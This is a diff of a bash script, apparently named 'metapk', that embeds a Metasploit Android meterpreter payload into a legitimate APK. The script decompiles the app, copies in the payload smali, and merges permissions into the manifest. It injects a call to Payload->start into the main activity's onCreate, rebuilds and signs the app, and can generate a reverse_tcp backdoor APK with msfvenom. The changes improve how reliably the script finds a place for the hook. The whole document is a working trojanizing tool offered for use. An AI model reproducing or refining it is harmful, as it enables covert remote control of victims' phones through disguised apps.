@@ -1,18 +1,20 @@
-#!/bin/bash
+#!/bin/bash -x
 excode=0
 if ! [ -d "$(pwd)/logs" ]; then
 	mkdir "$(pwd)/logs"
 fi
-logfile="$(pwd)/logs/metapk`date +%s`.log"
+logfile="./logs/metapk-`date +%s`.log"
+
 cleanup(){
 	echo "+ Cleaning Up"
-	for i in ./{activity, file}; do
+	for i in activity file smaliloc.tmp; do
 		[ ! -f $i ] || rm $i
 	done
 	rm -rf original/
 	rm -rf payload/
 	echo "+ Done"
 }
+
 manifest(){
 	x=$(grep -n -w uses-permission original/AndroidManifest.xml)
         while [ $(wc -l <<<$x) != 1 ]; do
@@ -26,20 +28,33 @@ manifest(){
                 x=$((x+1))
         done < manifest
         rm manifest
-	embed
-	sign
+	embed	
 	if [ "$?" != "0" ]; then
-		if [ "$(grep -w v0 $logfile)" == "v0" ]; then
+		if [ $hook -eq 1 ]; then
+		embed hook
+		sign
+	fi
+	if [ "$?" != "0" ]; then
+		if ! [ -z "$(grep -w v0 $logfile)" ]; then
 		embed fallback
 		sign
-else excode=1
 	fi
-	if [ "$excode" != "0" ]; then
+	fi	
+fi
+error_handler
+sign
+error_handler
+
+}
+
+error_handler(){
+if [ "$excode" != "0" ]; then
 		echo "> An Error Occured, See $logfile for details"
 		cleanup
+		exit 1
 	fi
-fi
 }
+
 browse_smali(){
 	for i in "$1"/*;
         do
@@ -54,18 +69,17 @@ browse_smali(){
         ext="nil"
     fi
         if [ "$ext" == "smali" ]; then
+        	if [ -z $x ]; then	        		
+		exit 1
+	fi
                smal=$(echo $i | grep -w $x.smali)
 			if [ "$smal" != "" ]; then
+				echo $smal > smaliloc.tmp
 				actvt=$(cat $smal | grep "\->onCreate(Landroid\/os\/Bundle;)V")
 				if [ -z "$actvt" ]; then
 					cat $smal | grep Activity > activity
-					read -r x < activity
-					x=$(sed 's/.*\///' <<< $x | sed 's/;.*//')
-					#if [ "$x" == "HomeActivity\$10"]; then
-					#	break
-					#fi
-					echo $x
-					read enter
+					read -r x < activity					
+					x=$(sed 's/.*\///' <<< $x | sed 's/;.*//')										
 					browse_smali original $x
 					break
 				else
@@ -76,18 +90,39 @@ browse_smali(){
         fi
 done
 }
+
 embed(){
 	hook=p0
 	if [ "$1" == "" ]; then
 	echo "+ Embedding Payload Into Original Apk"
-	fi
 	cat original/AndroidManifest.xml | grep \<activity > file
 	read -r x < file
-	x=$(sed 's/.*name="//' <<<$x | sed 's/\".*//' | sed 's/.*\.//')
-#	x=$(tr '.' '/' <<<$x)
-#	r=$(basename $x)
-#	y=${x:0:${#x} - ${#r}}
+	rm file
+	x=$(sed 's/.*name="//' <<<$x | sed 's/\".*//' | sed 's/.*\.//')	
 	x=$(browse_smali original $x)
+	fi
+
+	if [ "$1" == "hook" ]; then
+		if ! [ -f smaliloc.tmp ]; then
+			echo "> Couldn't Locate Smali File, Choose Another APK"
+			cleanup
+			exit 1
+		fi
+		read -r y < smaliloc.tmp
+		rm smaliloc.tmp
+		x=$(cat $y | grep -w invoke | sed 's/.*\,//' | sed 's/\;.*//' | sed 's/L//').smali
+		x=$(tr -d ' ' <<< $x)
+		for i in */* ;
+			do
+				if [ -f $i/$x ]; then
+					x=$i/$x
+				fi
+			done
+fi
+	if [ -z "$x" ]; then
+		hook=1
+		return 1
+	fi
 	read -r x <<<$x
 	if [ "$x" != "" ]; then
 	msg="Injecting Hook Into Smali File"
@@ -100,11 +135,11 @@ embed(){
 		echo "+ $msg"
         	 sed -i '/->onCreate(Landroid\/os\/Bundle;)V/a \    invoke-static {'$hook'}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' $x
 else echo "> Could Not Find Smali File To Inject Hook, See $logfile For Details"
+	cleanup
 	exit 1
         fi
-
-	rm file
 }
+
 sign(){
 echo "+ Building Original Apk"
  ./bin/apktool b original/ >> $logfile 2>&1
@@ -126,6 +161,7 @@ cp_payload(){
 	cp -r payload/smali/com/metasploit original/smali/com
 	manifest
 }
+
 decompile(){
 	echo "+ Decompiling Original Apk"
 	./bin/apktool d -f -o original $1 >> $logfile 2>&1
@@ -134,6 +170,7 @@ decompile(){
 	./bin/apktool d -f -o payload $1 >> $logfile 2>&1
 	cp_payload
 }
+
 create(){
 	msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=$1 lport=$2 -o backdoor.apk
 }
@@ -142,7 +179,7 @@ if [ "$1" == "-e" -o "$1" == "--embed" ]; then
 	shift
 	decompile $@
 elif [ "$1" == "--clean" ]; then
-	rm -rf original/ originalbak/ payload/
+	cleanup
 elif [ "$1" == "-c" -o "$1" == "create" ]; then
 	shift
 	create $@
